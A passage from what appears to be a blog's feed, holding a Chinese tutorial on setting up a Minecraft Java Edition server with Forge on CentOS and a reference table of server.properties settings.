LLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/13/5d02472b2408083161.png" alt="Snipaste_2019-06-13_20-52-44.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>在linux上搭建minecraft java版服务器</title>
    <link href="https://mrh1s.top/posts/6f2d090a/"/>
    <id>https://mrh1s.top/posts/6f2d090a/</id>
    <published>2019-06-09T03:36:09.000Z</published>
    <updated>2019-06-09T05:17:14.865Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="如何在Linux上搭建Minecraft服务器"><a href="#如何在Linux上搭建Minecraft服务器" class="headerlink" title="如何在Linux上搭建Minecraft服务器"></a>如何在Linux上搭建Minecraft服务器</h1><blockquote><p>搭建minecraft服务器并不复杂，只需要一些linux的基础操作知识就行了</p></blockquote><p>灵感来自<a href="https://blog.csdn.net/iwts_24/article/details/79181972" target="_blank" rel="noopener">csdn</a>，教程为自己编写.</p><h2 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h2><p>我选择的是<a href="https://promotion.aliyun.com/ntms/act/campus2018.html?spm=5176.10695662.1244717.1.17df4336v6PBv6" target="_blank" rel="noopener">阿里云学生机</a>，这样的配置能带好几个人加上几个大mod，几个小伙伴一起玩已经足够了</p><p>理论上Ubuntu也可以使用，不过这个教程里面的指令都是基于centOS的</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/09/5cfc7f897c0d832894.png" alt="Snipaste_2019-06-09_11-39-45.png"></p><h2 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h2><h3 id="查看java版本"><a href="#查看java版本" class="headerlink" title="查看java版本"></a>查看java版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java --version</span><br></pre></td></tr></table></figure><p>如果提示</p><blockquote><p>[root@vultr /]# java –version<br>-bash: java: command not found</p></blockquote><p>则说明没有安装java</p><p>安装java</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install java-1.8.0-openjdk</span><br></pre></td></tr></table></figure><hr><h3 id="选择目录"><a href="#选择目录" class="headerlink" title="选择目录"></a>选择目录</h3><p>然后自己找一个想装mc的目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd usr</span><br><span class="line">mkdir minecraft</span><br><span class="line">cd minecraft</span><br></pre></td></tr></table></figure><hr><h3 id="获取mc服务器端"><a href="#获取mc服务器端" class="headerlink" title="获取mc服务器端"></a>获取mc服务器端</h3><p>根据你玩的mc的版本，可以下载相应的jar包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget https://s3.amazonaws.com/Minecraft.Download/versions/版本号/minecraft_server.版本号.jar</span><br></pre></td></tr></table></figure><p>以我的为例，目前支持mod的最新版本是1.12.2</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget https://s3.amazonaws.com/Minecraft.Download/versions/1.12.2/minecraft_server.1.12.2.jar</span><br></pre></td></tr></table></figure><h2 id="开启游戏！"><a href="#开启游戏！" class="headerlink" title="开启游戏！"></a>开启游戏！</h2><h3 id="创建启动脚本"><a href="#创建启动脚本" class="headerlink" title="创建启动脚本"></a>创建启动脚本</h3><p>在这之前，先创建一个启动脚本，方便后续一键启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vi start.sh</span><br></pre></td></tr></table></figure><p>在start.sh填入如下的内容</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo java -Xms120m -Xmx160m -jar /usr/minecraft/minecraft_server.1.12.2.jar nogui</span><br></pre></td></tr></table></figure><p>其中120m,160m分别是给服务器分配的内存,建议如果是开forege服的话把最大内存调高一点,不然mod带不动</p><hr><h3 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h3><p>开启服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash start.sh</span><br></pre></td></tr></table></figure><p>不要着急，这里一定启动不了的，因为你没有同意用户协议</p><blockquote><p>[04:00:32] [Server thread/INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info.</p></blockquote><p>打开eula.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi eula.txt</span><br></pre></td></tr></table></figure><p>把false改为true</p><blockquote><p>eula=true</p></blockquote><h3 id="安装forge"><a href="#安装forge" class="headerlink" title="安装forge"></a>安装forge</h3><p>现在已经可以启动服务器了，<strong>无mod需求的可以直接开服,无需进行下面的步骤</strong></p><p>但是我们还是无法运行mod，需要安装forge</p><p>可以去<a href="https://files.minecraftforge.net/maven/net/minecraftforge/forge/index_1.12.2.html" target="_blank" rel="noopener">官网</a>自行下载，也可以用我的指令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wget https://files.minecraftforge.net/maven/net/minecraftforge/forge/1.12.2-14.23.5.2768/forge-1.12.2-14.23.5.2768-installer.jar</span><br></pre></td></tr></table></figure><p>接下来是安装forge</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar forge-1.12.2-14.23.5.2768-installer.jar nogui --installServer</span><br></pre></td></tr></table></figure><blockquote><p>Extracting: /forge-1.12.2-14.23.5.2768-universal.jar<br>To:          /usr/minecraft/./forge-1.12.2-14.23.5.2768-universal.jar<br>The server installed successfully, you should now be able to run the file forge-1.12.2-14.23.5.2768-universal.jar<br>You can delete this installer file now if you wish</p></blockquote><p>这个 <strong>forge-1.12.2-14.23.5.2768-universal.jar</strong> 就是启动forge服务器的启动端</p><p>打开start.sh把原版启动程序换为forge的启动程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vi start.sh</span><br></pre></td></tr></table></figure><blockquote><p>填入</p><p>sudo java -Xms120m -Xmx160m -jar /usr/minecraft/forge-1.12.2-14.23.5.2768-universal.jar nogui</p></blockquote><h3 id="开服"><a href="#开服" class="headerlink" title="开服"></a>开服</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash start.sh</span><br></pre></td></tr></table></figure><blockquote><p>[04:22:29] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing start region for level 0<br>[04:22:30] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 2%<br>[04:22:32] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 4%<br>[04:22:33] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 7%<br>[04:22:49] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 50%<br>[04:22:50] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 52%<br>[04:22:55] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 64%<br>[04:23:05] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 97%<br>[04:23:06] [Server thread/INFO] [minecraft/DedicatedServer]: Done (39.625s)! For help, type “help” or “?”</p></blockquote><h2 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h2><h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p>开服之后的服务器其实并不稳定,只要你关闭远程连接,mc便会自动结束</p><p>为了解决这个问题 就要用到screen工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install screen</span><br></pre></td></tr></table></figure><p>在开服之前,先创建一个screen</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -S mc</span><br></pre></td></tr></table></figure><p>创建好screen之后再开启mc服务器</p><p>当然,如果需要切换出来 , 按一下Ctrl+a  再按一下d即可</p><blockquote><p>[root@vultr ~]# screen -S mc<br>[detached from 7293.mc]<br>[root@vultr ~]# </p></blockquote><p>下次还需进入该screen,就不需要创建了,直接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -r mc</span><br></pre></td></tr></table></figure><h3 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h3><p>要加载mod,将服务器端使用的mod放入<strong>/usr/minecraft/mods</strong>文件夹,重启mc服务器即可</p><h3 id="server-properties"><a href="#server-properties" class="headerlink" title="server.properties"></a>server.properties</h3><p>配置文件修改,具体请参照<a href="https://minecraft.gamepedia.com/Server.properties" target="_blank" rel="noopener">官方文档</a></p><p>通常是把pvp,正版检测关闭</p><p>还可以限制总加入人数,服务器难度,以及最大高度等等</p><h6 id="Java-Edition"><a href="#Java-Edition" class="headerlink" title="Java Edition"></a>Java Edition</h6><table><thead><tr><th align="center">Key</th><th align="center">Type</th><th align="center">Default Value</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center"><strong>allow-flight</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Allows users to use flight on your server while in Survival mode, if they have a <a href="https://minecraft.gamepedia.com/Mod" target="_blank" rel="noopener">mod</a>that provides flight installed.With allow-flight enabled, <a href="https://minecraft.gamepedia.com/Griefers" target="_blank" rel="noopener">griefers</a> will possibly be more common, because it will make their work easier. In Creative mode this has no effect.<strong>false</strong> - Flight is not allowed (players in air for at least 5 seconds will be kicked).<strong>true</strong> - Flight is allowed, and used if the player has a fly mod installed.</td></tr><tr><td align="center"><strong>allow-nether</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Allows players to travel to the <a href="https://minecraft.gamepedia.com/Nether" target="_blank" rel="noopener">Nether</a>.<strong>false</strong> - <a href="https://minecraft.gamepedia.com/Nether" target="_blank" rel="noopener">Nether</a> portals will not work.<strong>true</strong> - The server will allow <a href="https://minecraft.gamepedia.com/Portal" target="_blank" rel="noopener">portals</a> to send players to the Nether.</td></tr><tr><td align="center"><strong>difficulty</strong></td><td align="center">string</td><td align="center">easy</td><td align="center">Defines the <a href="https://minecraft.gamepedia.com/Difficulty" target="_blank" rel="noopener">difficulty</a> (such as damage dealt by mobs and the way hunger and poison affects players) of the server.If a legacy difficulty number is specified it will be silently converted to a difficulty name.<strong>peaceful</strong> (0)<strong>easy</strong> (1)<strong>normal</strong> (2)<strong>hard</strong> (3)</td></tr><tr><td align="center"><strong>enable-command-block</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Enables command blocks</td></tr><tr><td align="center"><strong>enable-query</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Enables GameSpy4 protocol server listener. Used to get information about server.</td></tr><tr><td align="center"><strong>enable-rcon</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Enables remote access to the server console.</td></tr><tr><td align="center"><strong>force-gamemode</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Force players to join in the default <a href="https://minecraft.gamepedia.com/Game_mode" target="_blank" rel="noopener">game mode</a>.<strong>false</strong> - Players will join in the gamemode they left in.<strong>true</strong> - Players will always join in the default gamemode.</td></tr><tr><td align="center"><strong>gamemode</strong></td><td align="center">string</td><td align="center">survival</td><td align="center">Defines the <a href="https://minecraft.gamepedia.com/Game_mode" target="_blank" rel="noopener">mode of gameplay</a>.If a legacy gamemode number is specified it will be silently converted to a gamemode name.<strong>survival</strong> (0)<strong>creative</strong> (1)<strong>adventure</strong> (2)<strong>spectator</strong> (3)</td></tr><tr><td align="center"><strong>generate-structures</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Defines whether <a href="https://minecraft.gamepedia.com/Structures" target="_blank" rel="noopener">structures</a> (such as villages) will be generated.<strong>false</strong> - Structures will not be generated in new chunks.<strong>true</strong> - Structures will be generated in new chunks.<strong>Note:</strong> <em>Dungeons will still generate if this is set to false.</em></td></tr><tr><td align="center"><strong>generator-settings</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">The settings used to customize world generation. See <a href="https://minecraft.gamepedia.com/Superflat" target="_blank" rel="noopener">Superflat</a> and <a href="https://minecraft.gamepedia.com/Customized" target="_blank" rel="noopener">Customized</a> for possible settings and examples.</td></tr><tr><td align="center"><strong>hardcore</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">If set to <strong>true</strong>, server difficulty is ignored and set to hard and players will be set to spectator mode if they die.</td></tr><tr><td align="center"><strong>level-name</strong></td><td align="center">string</td><td align="center">world</td><td align="center">The “level-name” value will be used as the world name and its folder name. You may also copy your saved game folder here, and change the name to the same as that folder’s to load it instead.Characters such as ‘ (apostrophe) may need to be escaped by adding a backslash before them.</td></tr><tr><td align="center"><strong>level-seed</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">Add a <a href="https://minecraft.gamepedia.com/Seed_(level_generation)" target="_blank" rel="noopener">seed</a> for your world, as in Singleplayer.Some examples are: minecraft, 404, 1a2b3c.</td></tr><tr><td align="center"><strong>level-type</strong></td><td align="center">string</td><td align="center">default</td><td align="center">Determines the type of map that is generated.<strong>default</strong> - Standard world with hills, valleys, water, etc.<strong>flat</strong> - A flat world with no features, can be modified with <strong>generator-settings</strong>.<strong>largebiomes</strong> - Same as default but all biomes are larger.<strong>amplified</strong> - Same as default but world-generation height limit is increased.<strong>buffet</strong> - Same as default unless <strong>generator-settings</strong> is set to a preset.</td></tr><tr><td align="center"><strong>max-build-height</strong></td><td align="center">integer</td><td align="center">256</td><td align="center">The maximum height in which building is allowed. Terrain may still naturally generate above a low height limit.</td></tr><tr><td align="center"><strong>max-players</strong></td><td align="center">integer (0-2147483647)</td><td align="center">20</td><td align="center">The maximum number of players that can play on the server at the same time. Note that if more players are on the server it will use more resources. Note also, op player connections are not supposed to count against the max players, but ops currently cannot join a full server. However, this can be changed by going to the file called ops.json in your server directory, opening it, finding the op you want the change, and changing the setting called bypassesPlayerLimit to true (the default is false). This means that that op will not have to wait for a player to leave in order to join. Extremely large values for this field result in the client-side user list being broken.</td></tr><tr><td align="center"><strong>max-tick-time</strong></td><td align="center">integer (0–(2^63 - 1))</td><td align="center">60000</td><td align="center">The maximum number of milliseconds a single tick may take before the server watchdog stops the server with the message, <em>A single server tick took 60.00 seconds (should be max 0.05); Considering it to be crashed, server will forcibly shutdown.</em> Once this criterion is met, it calls System.exit(1).<strong>-1</strong> - disable watchdog entirely (this disable option was added in 14w32a)</td></tr><tr><td align="center"><strong>max-world-size</strong></td><td align="center">integer (1-29999984)</td><td align="center">29999984</td><td align="center">This sets the maximum possible size in blocks, expressed as a radius, that the <a href="https://minecraft.gamepedia.com/World_border" target="_blank" rel="noopener">world border</a> can obtain. Setting the world border bigger causes the commands to complete successfully but the actual border will not move past this block limit. Setting the max-world-size higher than the default doesn’t appear to do anything.Examples:Setting max-world-size to 1000 will allow you to have a 2000x2000 world border.Setting max-world-size to 4000 will give you an 8000 x 8000 world border.</td></tr><tr><td align="center"><strong>motd</strong></td><td align="center">string</td><td align="center"><em>A Minecraft Server</em></td><td align="center">This is the message that is displayed in the server list of the client, below the name.The MOTD supports <a href="https://minecraft.gamepedia.com/Formatting_codes" target="_blank" rel="noopener">color and formatting codes</a>.The MOTD supports special characters, such as “♥”. However, such characters must be converted to escaped Unicode form. An online converter can be found <a href="http://www.freeformatter.com/string-utilities.html#charinfo" target="_blank" rel="noopener">here</a>.If the MOTD is over 59 characters, the server list will likely report a communication error.</td></tr><tr><td align="center"><strong>network-compression-threshold</strong></td><td align="center">integer</td><td align="center">256</td><td align="center">By default it allows packets that are <em>n-1</em> bytes big to go normally, but a packet that <em>n</em>bytes or more will be compressed down. So, lower number means more compression but compressing small amounts of bytes might actually end up with a larger result than what went in.<strong>-1</strong> - disable compression entirely<strong>0</strong> - compress everything<strong>Note:</strong> <em>The Ethernet spec requires that packets less than 64 bytes become padded to 64 bytes. Thus, setting a value lower than 64 may not be beneficial. It is also not recommended to exceed the MTU, typically 1500 bytes.</em></td></tr><tr><td align="center"><strong>online-mode</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Server checks connecting players against <em>Minecraft</em> account database. Only set this to false if your server is <strong>not</strong> connected to the Internet. Hackers with fake accounts can connect if this is set to false! If minecraft.net is down or inaccessible, no players will be able to connect if this is set to true. Setting this variable to off purposely is called “cracking” a server, and servers that are presently with online mode off are called “cracked” servers, allowing players with unlicensed copies of <em>Minecraft</em> to join.<strong>true</strong> - Enabled. The server will assume it has an Internet connection and check every connecting player.<strong>false</strong> - Disabled. The server will not attempt to check connecting players.</td></tr><tr><td align="center"><strong>op-permission-level</strong></td><td align="center">integer (1-4)</td><td align="center">4</td><td align="center">Sets the default permission level for ops when using <code>/op</code>. All levels inherit abilities and commands from levels before them.<strong>1</strong> - Ops can bypass spawn protection.<strong>2</strong> - Ops can use all singleplayer cheats commands (except <code>/publish</code>, as it is not on servers; along with <code>/debug</code> and <code>/reload</code>) and use command blocks. Command blocks, along with Realms owners/operators, have the same permissions as this level.<strong>3</strong> - Ops can use most multiplayer-exclusive commands, including <code>/debug</code>, <code>/reload</code>, and commands that manage players (<code>/ban</code>, <code>/op</code>, etc).<strong>4</strong> - Ops can use all commands including <code>/stop</code>, <code>/save-all</code>, <code>/save-on</code>, <code>/save-off</code>, <code>/forceload add</code>, and <code>/forceload remove</code>.</td></tr><tr><td align="center"><strong>player-idle-timeout</strong></td><td align="center">integer</td><td align="center">0</td><td align="center">If non-zero, players are kicked from the server if they are idle for more than that many minutes.<strong>Note:</strong> <em>Idle time is reset when the server receives one of the following packets:</em><a href="http://wiki.vg/Protocol#Click_Window" target="_blank" rel="noopener">Click Window</a><a href="http://wiki.vg/Protocol#Enchant_Item" target="_blank" rel="noopener">Enchant Item</a><a href="http://wiki.vg/Protocol#Update_Sign" target="_blank" rel="noopener">Update Sign</a><a href="http://wiki.vg/Protocol#Player_Digging" target="_blank" rel="noopener">Player Digging</a><a href="http://wiki.vg/Protocol#Player_Block_Placement" target="_blank" rel="noopener">Player Block Placement</a><a href="http://wiki.vg/Protocol#Held_Item_Change_.28serverbound.29" target="_blank" rel="noopener">Held Item Change</a><a href="http://wiki.vg/Protocol#Animation_.28serverbound.29" target="_blank" rel="noopener">Animation</a> (swing arm)<a href="http://wiki.vg/Protocol#Entity_Action" target="_blank" rel="noopener">Entity Action</a><a href="http://wiki.vg/Protocol#Client_Status" target="_blank" rel="noopener">Client Status</a><a href="http://wiki.vg/Protocol#Chat_Message_.28serverbound.29" target="_blank" rel="noopener">Chat Message</a><a href="http://wiki.vg/Protocol#Use_Entity" target="_blank" rel="noopener">Use Entity</a></td></tr><tr><td align="center">prevent-proxy-connections</td><td align="center">boolean</td><td align="center">false</td><td align="center">If the ISP/AS sent from the server is different from the one from Mojang’s authentication server, the player is kicked<strong>true</strong> - Enabled. Server prevents users from using vpns or proxies.<strong>false</strong> - Disabled. The server doesn’t prevent users from using vpns or proxies.</td></tr><tr><td align="center"><strong>pvp</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Enable PvP on the server. Players shooting themselves with arrows will only receive damage if PvP is enabled.<strong>true</strong> - Players will be able to kill each other.<strong>false</strong> - Players cannot kill other players (also known as <strong>Player versus Environment</strong> (<strong>PvE</strong>)).<strong>Note:</strong> <em>Indirect damage sources spawned by players (such as lava, fire, TNT and to some extent water, sand and gravel) will still deal damage to other players.</em></td></tr><tr><td align="center"><strong>query.port</strong></td><td align="center">integer (1-65534)</td><td align="center">25565</td><td align="center">Sets the port for the query server (see <strong>enable-query</strong>).</td></tr><tr><td align="center"><strong>rcon.password</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">Sets the password to rcon.</td></tr><tr><td align="center"><strong>rcon.port</strong></td><td align="center">integer (1-65534)</td><td align="center">25575</td><td align="center">Sets the port to rcon.</td></tr><tr><td align="center"><strong>resource-pack</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">Optional URI to a <a href="https://minecraft.gamepedia.com/Resource_pack" target="_blank" rel="noopener">resource pack</a>. The player may choose to use it.Note that the “:” and “=” characters need to be escaped with backslash (), e.g. http://somedomain.com/somepack.zip?someparam=somevalueNote download success/failure is logged by the client, not by the server.</td></tr><tr><td align="center"><strong>resource-pack-sha1</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">Optional SHA-1 digest of the resource pack, in lowercase hexadecimal. It’s recommended to specify this. This is not yet used to verify the integrity of the resource pack, but improves the effectiveness and reliability of caching.</td></tr><tr><td align="center"><strong>server-ip</strong></td><td align="center">string</td><td align="center"><em>blank</em></td><td align="center">Set this if you want the server to bind to a particular IP. It is strongly recommended that you leave server-ip blank!Set to blank, or the IP you want your server to run (listen) on.</td></tr><tr><td align="center"><strong>server-port</strong></td><td align="center">integer (1-65534)</td><td align="center">25565</td><td align="center">Changes the port the server is hosting (listening) on. This port must be <a href="https://en.wikipedia.org/wiki/Port_forwarding" target="_blank" rel="noopener">forwarded</a> if the server is hosted in a network using <a href="https://en.wikipedia.org/wiki/Network_address_translation" target="_blank" rel="noopener">NAT</a> (If you have a home router/firewall).</td></tr><tr><td align="center"><strong>snooper-enabled</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Sets whether the server sends snoop data regularly to <a href="http://snoop.minecraft.net/" target="_blank" rel="noopener">http://snoop.minecraft.net</a>.<strong>false</strong> - disable snooping.<strong>true</strong> - enable snooping.</td></tr><tr><td align="center"><strong>spawn-animals</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Determines if <a href="https://minecraft.gamepedia.com/Animal" target="_blank" rel="noopener">animals</a> will be able to spawn.<strong>true</strong> - Animals spawn as normal.<strong>false</strong> - Animals will immediately vanish.<em>Tip: if you have major lag, turn this off/set to false.</em></td></tr><tr><td align="center"><strong>spawn-monsters</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Determines if monsters will be spawned.<strong>true</strong> - Enabled. Monsters will appear at night and in the dark.<strong>false</strong> - Disabled. No monsters.This setting has no effect if difficulty = 0 (peaceful). If difficulty is not = 0, a monster can still spawn from a <a href="https://minecraft.gamepedia.com/Monster_Spawner" target="_blank" rel="noopener">Monster Spawner</a>.<em>Tip: if you have major lag, turn this off/set to false.</em></td></tr><tr><td align="center"><strong>spawn-npcs</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Determines whether villagers will be spawned.<strong>true</strong> - Enabled. Villagers will spawn.<strong>false</strong> - Disabled. No villagers.</td></tr><tr><td align="center"><strong>spawn-protection</strong></td><td align="center">integer</td><td align="center">16</td><td align="center">Determines the radius of the <a href="https://minecraft.gamepedia.com/index.php?title=Spawn_protection&action=edit&redlink=1" target="_blank" rel="noopener">spawn protection</a> as 2<em>x</em>+1. Setting this to 0 will not disable spawn protection. 0 will protect the single block at the spawn point. 1 will protect a 3x3 area centered on the spawn point. 2 will protect 5x5, 3 will protect 7x7, etc. This option is not generated on the first server start and appears when the first player joins. If there are no <a href="https://minecraft.gamepedia.com/Operator" target="_blank" rel="noopener">ops</a> set on the server, the spawn protection will be disabled automatically.</td></tr><tr><td align="center"><strong>use-native-transport</strong></td><td align="center">boolean</td><td align="center">true</td><td align="center">Linux server performance improvements: optimized packet sending/receiving on Linux<strong>true</strong> - Enabled. Enable Linux packet sending/receiving optimization<strong>false</strong> - Disabled. Disable Linux packet sending/receiving optimization</td></tr><tr><td align="center"><strong>view-distance</strong></td><td align="center">integer (2-32)</td><td align="center">10</td><td align="center">Sets the amount of world data the server sends the client, measured in chunks in each direction of the player (radius, not diameter). It determines the server-side viewing distance. (see <a href="https://minecraft.gamepedia.com/Frame_rate#Render_distance" target="_blank" rel="noopener">Render distance</a>)<em>10 is the default/recommended. If you have major lag, reduce this value.<strong><em>*Note:</em></strong> *A value less than 9 will have big impacts on the mobs’ spawn of your server as it mentionned by the bug MC-2536.</em></td></tr><tr><td align="center"><strong>white-list</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Enables a whitelist on the server.With a whitelist enabled, users not on the whitelist will be unable to connect. Intended for private servers, such as those for real-life friends or strangers carefully selected via an application process, for example.<strong>false</strong> - No white list is used.<strong>true</strong> - The file whitelist.json is used to generate the white list.<strong>Note:</strong> <em>Ops are automatically white listed, and there is no need to add them to the whitelist.</em></td></tr><tr><td align="center"><strong>enforce-whitelist</strong></td><td align="center">boolean</td><td align="center">false</td><td align="center">Enforces the whitelist on the server.When this option is enabled, users who are not present on the whitelist (if it’s enabled) will be kicked from the server after the server reloads the whitelist file.<strong>false</strong> - No user will be kicked if not on the whitelist.<strong>true</strong> - Online users not on the whitelist will be kicked.</td></tr></tbody></table><p>In versions prior to <a href="https://minecraft.gamepedia.com/Java_Edition_1.12" target="_blank" rel="noopener">Java Edition 1.12</a>, the <strong>announce-player-achievements</strong> boolean property (default true) was used to toggle whether <a href="https://minecraft.gamepedia.com/Achievements" target="_blank" rel="noopener">achievements</a>were broadcasted to all players. This property no longer exists, but if it is set, the <code>announceAdvancements</code> <a href="https://minecraft.gamepedia.com/Gamerule" target="_blank" rel="noopener">gamerule</a> will automatically be updated to match and the property will be removed.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>让win10系统任务栏变为透明</title>
